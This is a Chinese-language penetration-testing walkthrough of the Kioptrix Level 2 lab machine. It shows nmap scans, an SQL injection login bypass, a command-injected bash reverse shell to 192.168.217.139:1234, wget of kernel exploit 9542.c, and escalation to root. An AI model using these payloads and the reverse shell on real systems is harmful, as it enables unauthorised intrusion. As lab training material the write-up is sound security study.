### 端口扫描

```bash
nmap -sT -T4 -p- 192.168.217.140
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
658/tcp  open  tenfold
3306/tcp open  mysql
MAC Address: 00:0C:29:25:AF:96 (VMware)
```

```bash
nmap -sT -sV -sC -O -p22,80,111,443,631,658,3306 192.168.217.140
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            655/udp   status
|_  100024  1            658/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_http-server-header: Apache/2.0.52 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2024-11-04T10:43:17+00:00; -2h09m44s from scanner time.
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.1
| http-methods: 
|_  Potentially risky methods: PUT
658/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:25:AF:96 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
```

```bash
nmap --script=vuln -p80,111,443,631,658,3306 192.168.217.140
```

### web渗透

一个登录框，结合上面扫到的3306端口，可以测试万能密码

`1' or 1=1#`

成功登录

![image-20241105134558773](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241105134558773.png)

可以进行命令注入

`;bash -i >& /dev/tcp/192.168.217.139/1234 0>&1`

### 内核提权

常规提权方法，没发现什么利用点

尝试内核提权

```bash
bash-3.00$ cat /etc/*release
CentOS release 4.5 (Final)
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

搜索漏洞

```
searchsploit linux kernel 2.6 centos
```

![image-20241105135237085](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241105135237085.png)

```bash
python3 -m http.server 8888
wget http://192.168.217.139:8888/9542.c
```

下载到靶机，进行编译

```
gcc 9542.c -o exp
```

```bash
bash-3.00$ ./exp
sh: no job control in this shell
sh-3.00# whoami
root
```

